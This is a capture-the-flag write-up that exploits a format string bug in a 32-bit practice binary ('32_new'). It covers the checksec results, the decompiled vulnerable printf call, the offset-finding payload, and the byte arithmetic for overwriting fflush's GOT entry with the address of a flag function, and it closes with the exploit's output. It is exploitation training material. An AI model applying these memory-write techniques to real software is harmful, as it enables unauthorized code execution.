# 32_new

Start with some basic file enumeration

```s
$ file 32_new                   
32_new: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=da5e14c668579652906e8dd34223b8b5aa3becf8, not stripped
$ pwn checksec 32_new           
[*] '32_new'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

The NX bit being enabled. If we want any code execution, we'll need to perform a ret2libc. There is also partial RELRO so we'll be able to write to the GOT and redirect code execution.

Lets take a look at `main` in Ghidra:

```s
void main(undefined4 param_1,undefined4 param_2)
{
  int in_GS_OFFSET;
  char user_input [200];
  char target [300];
  undefined4 local_14;
  undefined4 *puStack_c;
  
  puStack_c = &param_1;
  local_14 = *(undefined4 *)(in_GS_OFFSET + 0x14);
  puts("Hello baby pwner, whats your name?");
  fflush(stdout);
  fgets(user_input,200,stdin);
  fflush(stdin);
  sprintf(target,"Ok cool, soon we will know whether you pwned it or not. Till then Bye %s",
          user_input);
  fflush(stdout);
  printf(target);
  fflush(stdout);
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

Looks like there is a format string vulnerability. Let's see if we can find the offset in order to perform a write:

```s
$ python3 -c 'import sys;sys.stdout.buffer.write(b"AAAABBBBCCCCDDDDEEEE" + b"%10$hp%11$hp%12$p")' | ./32_new
Hello baby pwner, whats your name?
Ok cool, soon we will know whether you pwned it or not. Till then Bye AAAABBBBCCCCDDDDEEEE0x414141410x424242420x43434343
```

Looks like 10, 11, 12 are the offsets. Now where do we want to write? Both `fflush` and `exit` would be good candidates. I decided to overwrite `fflush` GOT entry. 

Now, what do we want to write? Looks like this challenge is a ret2win. There is a function called `flag`:

```c

/* WARNING: Unknown calling convention -- yet parameter storage is locked */
/* flag() */

void flag(void)

{
  system("cat flag.txt");
  return;
}

```

The address of `flag` is `0x0804870b`. Let's overwrite the GOT entry of `fflush` with the address of `flag`. 

First, determine the state of the address we want to write to:

```s
gef➤  x/xw 0x0804a028
0x804a028 <fflush@got.plt>:     0x52005252
```

We want `0x52` to be `0x0b`. To acheive this: `(0x100 - 0x52) + 0x0b` or 185 bytes.

```s
gef➤  x/xw 0x0804a028
0x804a028 <fflush@got.plt>:     0x0b010b0b
```

Now we want the value of the next two bytes to be `0487`. The beginning value is `010b`. So... `0x0487 - 0x010b` or 892 bytes.

```s
gef➤  x/xw 0x0804a028
0x804a028 <fflush@got.plt>:     0x8704870b
```

For the last byte we have `0x87` and we want `0x08`. So... `(0x100 - 0x87) + 0x08` or 129 bytes.

```s
gef➤  x/xw 0x0804a028
0x804a028 <fflush@got.plt>:     0x0804870b
```

Lets verify the results:

```s
$ ./exploit.py    
[+] Starting local process '/home/cerberus-bytes/Documents/Repos/Cerberus-bytes/CTF/Practice/nightmare/10-fmt_strings/backdoor17_bbpwn/32_new': pid 11636
[*] Switching to interactive mode

Ok cool, soon we will know whether you pwned it or not. Till then Bye (\xa0\x04)\xa0\x04+\xa0\x04                                                                                                                                                                                  8048914                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ffffcb48                                                                                                                         ffffcbe0
[*] Process '/home/cerberus-bytes/Documents/Repos/Cerberus-bytes/CTF/Practice/nightmare/10-fmt_strings/backdoor17_bbpwn/32_new' stopped with exit code 1 (pid 11636)
flag{g0ttem_b0yz}
```